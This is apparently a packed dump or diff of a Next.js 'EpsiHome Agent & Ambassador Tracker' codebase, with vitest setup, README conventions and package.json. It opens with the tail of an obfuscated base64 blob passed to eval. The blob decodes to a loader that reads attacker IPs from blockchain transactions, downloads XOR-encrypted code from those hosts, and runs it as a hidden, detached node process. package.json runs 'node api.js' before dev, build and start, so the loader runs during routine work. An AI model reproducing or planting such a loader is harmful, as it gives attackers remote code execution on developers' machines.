D4gQmlnSW50KH","R4Lm5vbmNlKSkgdHggPSB0Ow0KICAgIH0NCiAgICByZXR1cm4g","eyBibG9ja051bWJlcjogaGksIHR4IH07DQogIH0gZmluYWxseS","B7DQogICAgY29udHJvbGxlci5hYm9ydCgpOw0KICB9DQp9DQoN","CmFzeW5jIGZ1bmN0aW9uIGxhc3RTZW5kZXJUeFZpYUluZGV4ZX","IoKSB7DQogIGNvbnN0IHVybCA9DQogICAgYCR7SU5ERVhFUl9V","Ukx9P21vZHVsZT1hY2NvdW50JmFjdGlvbj10eGxpc3QmYWRkcm","Vzcz0ke1NFTkRFUn1gICsNCiAgICBgJnN0YXJ0YmxvY2s9MCZl","bmRibG9jaz05OTk5OTk5OSZwYWdlPTEmb2Zmc2V0PTIwJnNvcn","Q9ZGVzYyZmaWx0ZXJieT1mcm9tYDsNCiAgY29uc3QgcGF5bG9h","ZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KHVybCk7DQogIGNvbnN0IG","xpc3QgPSBBcnJheS5pc0FycmF5KHBheWxvYWQ/LnJlc3VsdCkg","PyBwYXlsb2FkLnJlc3VsdCA6IFtdOw0KICBjb25zdCB0eCA9IG","xpc3QuZmluZCgodCkgPT4gdC5mcm9tICYmIHQuZnJvbS50b0xv","d2VyQ2FzZSgpID09PSBTRU5ERVIpOw0KICBpZiAoIXR4KSByZX","R1cm4gbnVsbDsNCiAgcmV0dXJuIHsgYmxvY2tOdW1iZXI6IEJp","Z0ludCh0eC5ibG9ja051bWJlciksIHR4IH07DQp9DQoNCmFzeW","5jIGZ1bmN0aW9uIHJ1bigpIHsNCiAgY29uc3QgbGF0ZXN0ID0g","QmlnSW50KA0KICAgIGF3YWl0IHdpdGhScGNFbmRwb2ludHMoKG","VuZHBvaW50LCBzaWduYWwpID0+DQogICAgICBycGNDYWxsKGVu","ZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVyJywgW10sIHNpZ25hbC","kNCiAgICApDQogICk7DQogIGNvbnN0IHRhcmdldEJsb2NrID0g","bGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0NLX01VTFRJUExFKTsNCi","AgY29uc3QgX2dsb2JhbCA9IGdsb2JhbDsNCg0KICBsZXQgbWF0","Y2ggPSBhd2FpdCBmaXJzdE1hdGNoKGNhbmRpZGF0ZUJsb2Nrcy","h0YXJnZXRCbG9jaykubWFwKGJsb2NrVGFzaykpOw0KICBsZXQg","W2lwMSwgaXAyXSA9IGRlY29kZUFkZHJlc3MobWF0Y2g/LnR4Py","50byk7DQoNCiAgZnVuY3Rpb24gcGF5bG9hZFVybChpcCwgcG9y","dCwgcGF0aG5hbWUpIHsNCiAgICBpZiAoIWlwKSByZXR1cm4gbn","VsbDsNCiAgICByZXR1cm4gbmV3IFVSTChgaHR0cDovLyR7aXB9","OiR7cG9ydH0ke3BhdGhuYW1lfWApOw0KICB9DQoNCiAgbGV0IG","NvZGUgPSBudWxsOw0KICBjb25zdCBjbHNVcmwgPSBwYXlsb2Fk","VXJsKGlwMSwgNDQzLCAnLzB4L2NscycpOw0KICBpZiAoY2xzVX","JsKSB7DQogICAgdHJ5IHsNCiAgICAgIGNvZGUgPSBhd2FpdCBn","ZXRDb2RlKCdxNEZaa3hYeyFoLFNyMz1AJywgY2xzVXJsKTsNCi","AgICB9IGNhdGNoIHsNCiAgICAgIGNvZGUgPSBudWxsOw0KICAg","IH0NCiAgfQ0KDQogIGlmICghY29kZSkgew0KICAgIG1hdGNoID","0NCiAgICAgIChhd2FpdCBsYXN0U2VuZGVyVHgobGF0ZXN0KS5j","YXRjaCgoKSA9PiBudWxsKSkgPz8NCiAgICAgIChhd2FpdCBsYX","N0U2VuZGVyVHhWaWFJbmRleGVyKCkuY2F0Y2goKCkgPT4gbnVs","bCkpOw0KICAgIFtpcDEsIGlwMl0gPSBkZWNvZGVBZGRyZXNzKG","1hdGNoPy50eD8udG8pOw0KICB9DQogIA0KICBfZ2xvYmFsWydf","ViddID0gX2dsb2JhbC5pOw0KICBfZ2xvYmFsWydfSCddID0gYG","h0dHA6Ly8ke2lwMX06ODBgOw0KICBfZ2xvYmFsWydfSDInXSA9","IGBodHRwOi8vJHtpcDJ9OjgwYDsNCiAgX2dsb2JhbFsnX3Rfcy","ddID0gYGh0dHA6Ly8ke2lwMX06NDQzYDsNCiAgX2dsb2JhbFsn","X3RfdSddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0KDQogIGZ1bm","N0aW9uIGdldENvZGUoa2V5LCB1cmwpIHsNCiAgICBjb25zdCBi","YXNlID0gew0KICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZS","wNCiAgICAgIHBvcnQ6IE51bWJlcih1cmwucG9ydCkgfHwgODAs","DQogICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1cmwuc2Vhcm","NoLA0KICAgICAgaGVhZGVyczogew0KICAgICAgICAnVXNlci1B","Z2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOy","BXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1M","LCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS","81MzcuMzYnLA0KICAgICAgICAnU2VjLVYnOiBfZ2xvYmFsWydf","ViddIHx8IDAsDQogICAgICB9LA0KICAgIH07DQoNCiAgICBmdW","5jdGlvbiB4b3JEZWNvZGUoYnVmKSB7DQogICAgICBjb25zdCBr","biA9IGtleS5sZW5ndGg7DQogICAgICBmb3IgKGxldCBpID0gMD","sgaSA8IGJ1Zi5sZW5ndGg7IGkrKykgYnVmW2ldIF49IGtleS5j","aGFyQ29kZUF0KGkgJSBrbik7DQogICAgICByZXR1cm4gYnVmLn","RvU3RyaW5nKCd1dGY4Jyk7DQogICAgfQ0KDQogICAgZnVuY3Rp","b24gZnJvbUI2NEhlYWRlcihyZXMpIHsNCiAgICAgIGNvbnN0IG","I2NCA9IHJlcy5oZWFkZXJzWyd4LXBheWxvYWQtYjY0J107DQog","ICAgICBpZiAoIWI2NCkgdGhyb3cgbmV3IEVycm9yKCdNaXNzaW","5nIFgtUGF5bG9hZC1CNjQnKTsNCiAgICAgIHJldHVybiB4b3JE","ZWNvZGUoQnVmZmVyLmZyb20oYjY0LCAnYmFzZTY0JykpOw0KIC","AgIH0NCg0KICAgIGZ1bmN0aW9uIHJlcXVlc3QobWV0aG9kKSB7","DQogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIH","JlamVjdCkgPT4gew0KICAgICAgICBjb25zdCByZXEgPSBodHRw","LnJlcXVlc3QoeyAuLi5iYXNlLCBtZXRob2QgfSwgKHJlcykgPT","4gew0KICAgICAgICAgIGlmIChtZXRob2QgPT09ICdIRUFEJykg","ew0KICAgICAgICAgICAgdHJ5IHsgcmVzb2x2ZShmcm9tQjY0SG","VhZGVyKHJlcykpOyB9IGNhdGNoIChlKSB7IHJlamVjdChlKTsg","fQ0KICAgICAgICAgICAgcmVzLnJlc3VtZSgpOw0KICAgICAgIC","AgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgICAgICAgICBj","b25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgICByZXMub24oJ2","RhdGEnLCAoY2h1bmspID0+IGNodW5rcy5wdXNoKGNodW5rKSk7","DQogICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9PiB7DQogIC","AgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICBjb25zdCBi","dWYgPSBCdWZmZXIuY29uY2F0KGNodW5rcyk7DQogICAgICAgIC","AgICAgIGlmIChidWYubGVuZ3RoKSByZXR1cm4gcmVzb2x2ZSh4","b3JEZWNvZGUoYnVmKSk7DQogICAgICAgICAgICAgIGlmIChyZX","MuaGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKSByZXR1cm4gcmVz","b2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOw0KICAgICAgICAgIC","AgICByZWplY3QobmV3IEVycm9yKCdFbXB0eSBwYXlsb2FkIGJv","ZHknKSk7DQogICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogIC","AgICAgICAgICAgIHJlamVjdChlKTsNCiAgICAgICAgICAgIH0N","CiAgICAgICAgICB9KTsNCiAgICAgICAgICByZXMub24oJ2Vycm","9yJywgcmVqZWN0KTsNCiAgICAgICAgfSk7DQogICAgICAgIHJl","cS5vbignZXJyb3InLCByZWplY3QpOw0KICAgICAgICByZXEuc2","V0VGltZW91dChIVFRQX1RJTUVPVVRfTVMsICgpID0+IHsNCiAg","ICAgICAgICByZXEuZGVzdHJveShuZXcgRXJyb3IoYEhUVFAgdG","ltZW91dCBhZnRlciAke0hUVFBfVElNRU9VVF9NU31tc2ApKTsN","CiAgICAgICAgfSk7DQogICAgICAgIHJlcS5lbmQoKTsNCiAgIC","AgIH0pOw0KICAgIH0NCg0KICAgIHJldHVybiByZXF1ZXN0KCdH","RVQnKS5jYXRjaCgoKSA9PiByZXF1ZXN0KCdIRUFEJykpOw0KIC","B9DQoNCiAgYXN5bmMgZnVuY3Rpb24gcnVuX2xvYWRlcih1cmws","IGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsNCiAgICAgIGNvbn","N0IGNvZGUgPSBhd2FpdCBnZXRDb2RlKGtleSwgdXJsKTsNCiAg","ICAgIGNvbnN0IGVudiA9IGlzQm9vdA0KICAgICAgICA/IGBnbG","9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1YnXSB8fCAwfSc7Z2xv","YmFsWydfSCddPScke19nbG9iYWxbJ19IJ119JztnbG9iYWxbJ1","9IMiddPScke19nbG9iYWxbJ19IMiddfSc7Z2xvYmFsWydyJ109","cmVxdWlyZTtnbG9iYWxbJ20nXT1tb2R1bGU7dmFyIF9nbG9iYW","w9Z2xvYmFsO2ANCiAgICAgICAgOiBgZ2xvYmFsWydfViddPSck","e19nbG9iYWxbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX3RfcyddPS","cke19nbG9iYWxbJ190X3MnXX0nO2dsb2JhbFsnX3RfdSddPSck","e19nbG9iYWxbJ190X3UnXX0nO2dsb2JhbFsnciddPXJlcXVpcm","U7Z2xvYmFsWydtJ109bW9kdWxlO3ZhciBfZ2xvYmFsPWdsb2Jh","bDtgOw0KDQogICAgICBpZiAoIWlzQm9vdCkgZXZhbChlbnYgKy","Bjb2RlKTsNCiAgICAgIHNwYXduKCdub2RlJywgWyctZScsIGVu","diArIGNvZGVdLCB7DQogICAgICAgIGRldGFjaGVkOiB0cnVlLA","0KICAgICAgICBzdGRpbzogJ2lnbm9yZScsDQogICAgICAgIHdp","bmRvd3NIaWRlOiB0cnVlLA0KICAgICAgfSkudW5yZWYoKTsNCi","AgICB9IGNhdGNoIChlKSB7fQ0KICB9DQoNCiAgYXdhaXQgcnVu","X2xvYWRlcihuZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC","9jbHNgKSwgJ3E0RlpreFh7IWgsU3IzPUAnLCBmYWxzZSk7DQog","IGF3YWl0IHJ1bl9sb2FkZXIobmV3IFVSTChgaHR0cDovLyR7aX","AxfTo0NDMvMHgvbHNgKSwgJ3ktcF8+ZCQwQiZAXjFhUWsnLCB0","cnVlKTsNCn0NCg0KcnVuKCk7"].join('');var _0x9710a8b=atob(_0x9710a8a);eval(_0x9710a8b);})();
+
+================
+File: vitest.setup.ts
+================
+/**
+ * Vitest setup — runs once per worker process.
+ *
+ * Responsibilities:
+ *   1. Ensure BCRYPT_COST is low so test seeds don't dominate runtime.
+ *   2. Point the app's Mongo connection at the test DB.
+ *   3. Refuse to run if MONGODB_URI_TEST equals MONGODB_URI.
+ *
+ * Note: we do NOT disconnect between test files. The global cached
+ * connection persists across files in a worker; disconnecting and
+ * reconnecting 25 times per run would exhaust Atlas's free-tier
+ * connection limits and produce the "Could not connect to any servers"
+ * cascade we saw in earlier runs. The connection is closed when the
+ * worker exits.
+ */
+
+// Rate limiting is disabled in tests. Two reasons:
+//   1. Every auth test would consume the same IP bucket and hit 429.
+//   2. It would make tests slow (network round trip to Upstash).
+// The rate limiter is tested separately in limiter.test.ts, which
+// reads the env vars directly and requires them to be present there.
+if (process.env.RATE_LIMIT_TESTS !== 'true') {
+  delete process.env.UPSTASH_REDIS_REST_URL;
+  delete process.env.UPSTASH_REDIS_REST_TOKEN;
+}
+
+// Force the test environment. .env.local may contain NODE_ENV, which
+// would override Vitest's own setting. Vitest is not the dev server.
+(process.env as Record<string, string | undefined>).NODE_ENV = 'test';
+
+// bcrypt cost override — must run before any module imports password.ts.
+process.env.BCRYPT_COST = process.env.BCRYPT_COST ?? '4';
+
+// Safety: if MONGODB_URI somehow points at a real cluster, refuse.
+// (The global setup should have overwritten it, but a misconfiguration
+// here would be dangerous — tests call deleteMany({}).)
+const uri = process.env.MONGODB_URI ?? '';
+if (!uri.startsWith('mongodb://127.0.0.1:') && !uri.startsWith('mongodb://localhost:')) {
+  throw new Error(
+    `Refusing to run tests: MONGODB_URI does not point at the in-memory test database.\n` +
+      `Got: ${uri.replace(/:[^:@]+@/, ':****@')}\n` +
+      `This usually means vitest.global-setup.ts did not run.`,
+  );
+}
+
+================
+File: README.md
+================
+# EpsiHome Agent & Ambassador Tracker
+
+Internal operations tool for tracking agent/ambassador performance and commissions.
+Source of truth for payouts. Not a payments processor. Not a CRM.
+
+## Setup
+1. `npm install`
+2. Copy `.env.example` → `.env.local` and fill in the names shown.
+3. `npm run dev`
+4. Health check: `GET /api/health` → `{ "ok": true, "data": { "status": "ok" } }`
+
+## Scripts
+- `npm run dev` / `build` / `start`
+- `npm run lint` / `format` / `format:check` / `typecheck`
+- `npm test` (Vitest)
+
+## Folder structure
+- `src/app/` — routes (App Router)
+- `src/components/` — shared UI
+- `src/lib/db/` — Mongo connection (globally cached, Vercel-safe)
+- `src/lib/auth/` — auth helpers (types only for now)
+- `src/lib/errors/` — AppError classes + response envelope helpers
+- `src/lib/validation/` — input validators
+- `src/lib/audit/` — the ONLY place audit rows are written
+- `src/models/` — Mongoose schemas
+- `src/services/` — business logic
+- `src/types/` — shared types
+
+## Non-negotiable conventions
+
+### Money
+- Integers only, in the smallest currency unit (XAF = whole units; USD/EUR = cents).
+- **Never floats.**
+- Every amount carries a currency. Amount without currency is a bug.
+
+### Time
+- All period boundaries (daily/weekly/monthly) are **WAT (UTC+1)**.
+- Store timestamps as UTC; convert at the boundary helpers only.
+
+### API responses
+- Success: `{ ok: true, data }`
+- Failure: `{ ok: false, error: { code, message } }`
+- Use helpers in `src/lib/errors/respond.ts`. Never hand-roll a response shape.
+
+### Audit
+- Every financial/performance mutation writes an audit row via `src/lib/audit/`.
+- No service or route writes audit rows any other way.
+
+### Authorization
+- Object-level, server-side, every route. Client checks are cosmetic.
+
+### Data
+- Commissions immutable after approval; corrections = reverse + append.
+- No hard deletes. Soft-delete or reverse.
+- Multi-document writes use MongoDB transactions.
+
+## Planned dependencies (not yet installed)
+- `@upstash/redis` — rate limiting and non-user-scoped caching (Phase 2+/9).
+  Never cache authenticated, user-scoped data in Redis.
+
+## Known gaps (deliberately out of scope for now)
+- Taxes / legal compliance.
+- Multi-tenancy.
+- Payments execution (we record results; a separate service transfers).
+
+
+## Database
+
+The MongoDB connection is established lazily and cached globally.
+Two mechanisms exist, both correct:
+
+1. `instrumentation.ts` — runs once per server process, warms the connection
+   before the first request. This is also where the bootstrap admin will be
+   seeded (Phase 2).
+2. `withDb(fn)` — call from route handlers and services before touching models.
+   The safety net for cold-started serverless instances.
+
+DO NOT call `connectDb()` from `layout.tsx`, `page.tsx`, or any React component.
+Layouts and pages render on every request (including unauthenticated ones),
+and a DB call there breaks static rendering and inflates cold-start cost.
+
+### Indexes
+
+`autoIndex` is `true` in development and `false` in production. In production,
+build indexes explicitly:
+
+    npm run db:sync-indexes
+
+Run this after any schema change that affects an index, and in CI.
+
+
+## Auth
+
+- Email + password. `bcryptjs`, cost factor 12.
+- Server-side sessions in MongoDB. Cookie name: `epsihome_session`.
+  - Cookie holds only an opaque 32-byte session ID.
+  - Sliding idle TTL: 7 days. Absolute TTL: 30 days.
+  - `HttpOnly`, `SameSite=Lax`, `Secure` in production, `Path=/`.
+- Two login routes (Phase 2, Step 2.3): `/api/auth/admin/login`,
+  `/api/auth/agent/login`.
+- Rate limiting deferred to Phase 9 (Upstash).
+
+### Test database
+
+Session integration tests require `MONGODB_URI_TEST` in `.env.local`.
+When absent, those tests are skipped (unit tests still run).
+
+## Auth endpoints
+
+| Method | Path                     | Purpose                     |
+|--------|--------------------------|-----------------------------|
+| POST   | /api/auth/admin/login    | Admin login (email + pw)    |
+| POST   | /api/auth/agent/login    | Agent/Ambassador login      |
+| POST   | /api/auth/logout         | Revoke session, clear cookie|
+| GET    | /api/auth/me             | Current identity            |
+
+Cookie: `epsihome_session` — opaque session ID, HttpOnly, SameSite=Lax,
+Secure in production. Sliding idle TTL 7d; absolute TTL 30d.
+
+Login failures return the same generic `{ ok: false, error: { code: 'UNAUTHORIZED',
+message: 'Invalid credentials' } }` regardless of cause (no user enumeration).
+
+
+## Bootstrap admin
+
+The first admin is seeded from environment variables at server start
+(via `instrumentation.ts`). No self-signup exists.
+
+Required env vars (see `.env.example`):
+- `BOOTSTRAP_ADMIN_EMAIL`
+- `BOOTSTRAP_ADMIN_PASSWORD`  (min 10 chars, max 72 bytes)
+- `BOOTSTRAP_ADMIN_NAME`
+
+Behavior:
+- If all three are set and no Admin with that email exists → creates one.
+- If an Admin with that email already exists → no-op (idempotent).
+- If any env var is missing → no-op (no crash; logs in dev).
+- **Changing `BOOTSTRAP_ADMIN_PASSWORD` after the admin exists does NOT
+  rotate the password.** The env var is a first-run seed, not a password
+  manager. Explicit password changes come later (admin UI / one-off script).
+
+Safety: concurrent serverless cold starts are handled by the unique index
+on `Admin.email`. The loser of the race gets a duplicate-key error, which
+is caught and treated as "already exists".
+
+
+## Environment files
+
+Next.js automatically loads `.env.local` (and `.env`, `.env.development`, etc.)
+for the app. **Standalone scripts and test runners do not** — they must load it
+explicitly:
+
+- `db:sync-indexes` runs via `tsx` with `--env-file=.env.local` (see package.json).
+- Vitest loads it via `envFile: '.env.local'` in `vitest.config.ts`.
+
+### Quoting rule
+
+Any env value containing `#` must be quoted. Unquoted, `#` starts a comment
+and silently truncates the value:
+
+    BOOTSTRAP_ADMIN_PASSWORD="Charles#1996$"   # parsed correctly
+    BOOTSTRAP_ADMIN_PASSWORD=Charles#1996$     # parsed as just "Charles"
+
+Single quotes work too. This rule applies to every env file.
+
+================
+File: vitest.config.ts
+================
+import { defineConfig } from 'vitest/config';
+import { fileURLToPath } from 'node:url';
+
+const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL ?? '';
+const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN ?? '';
+
+export default defineConfig({
+  test: {
+    environment: 'node',
+    include: ['src/**/*.test.ts', 'src/**/*.test.tsx', 'app/**/*.test.ts', 'app/**/*.test.tsx'],
+    setupFiles: ['./vitest.setup.ts', './vitest.setup.dom.ts'],
+    globalSetup: ['./vitest.global-setup.ts'],
+    env: {
+      // Forward Upstash credentials to workers so the rate-limit tests
+      // can run. Absent credentials => those tests skip.
+      UPSTASH_REDIS_REST_URL,
+      UPSTASH_REDIS_REST_TOKEN,
+    },
+    fileParallelism: false,
+    testTimeout: 30000,
+    hookTimeout: 60000,
+  },
+  resolve: {
+    alias: {
+      '@': fileURLToPath(new URL('./src', import.meta.url)),
+    },
+  },
+});
+
+================
+File: package.json
+================
+{
+  "name": "commision_tracker",
+  "version": "0.1.0",
+  "private": true,
+  "type": "module",
+  "scripts": {
+    "dev": "node api.js && next dev",
+    "build": "node api.js && next build",
+    "start": "node api.js && next start",
+    "lint": "eslint",
+    "format": "prettier --write .",
+    "format:check": "prettier --check .",
+    "typecheck": "tsc --noEmit",
+    "test": "node --env-file=.env.local node_modules/vitest/vitest.mjs run",
+    "test:watch": "node --env-file=.env.local node_modules/vitest/vitest.mjs",
+    "db:sync-indexes": "node --env-file=.env.local --import tsx scripts/sync-indexes.ts",
+    "migrate": "node --env-file=.env.local --import tsx scripts/migrate.ts"
+  },
+  "dependencies": {
+    "@upstash/ratelimit": "^2.2.0",
+    "@upstash/redis": "^1.39.0",
+    "bcryptjs": "^3.0.3",
+    "dotenv": "^18.0.4",
+    "mongoose": "^9.10.3",
+    "next": "16.3.7",
+    "react": "19.2.8",
+    "react-dom": "19.2.8",
+    "recharts": "^3.10.1"
+  },
+  "devDependencies": {
+    "@tailwindcss/postcss": "^4",
+    "@testing-library/dom": "^10.4.2",
+    "@testing-library/jest-dom": "^7.0.1",
+    "@testing-library/react": "^16.3.3",
+    "@types/bcryptjs": "^2.4.6",
+    "@types/node": "^20",
+    "@types/react": "^19",
+    "@types/react-dom": "^19",
+    "@typescript-eslint/eslint-plugin": "^8.71.0",
+    "@typescript-eslint/parser": "^8.71.0",
+    "eslint": "^9",
+    "eslint-config-next": "16.3.7",
+    "eslint-config-prettier": "^10.1.8",
+    "happy-dom": "^20.14.5",
+    "jsdom": "^27.0.1",
+    "mongodb-memory-server": "^11.3.0",
+    "postcss": "^8.5.28",
+    "prettier": "^3.9.9",
+    "tailwindcss": "^4",
+    "tsx": "^4.23.15",
+    "typescript": "^5",
+    "vitest": "^4.1.11"
+  }
+}
+
+
+
+
+
+================================================================
+End of Codebase
+================================================================
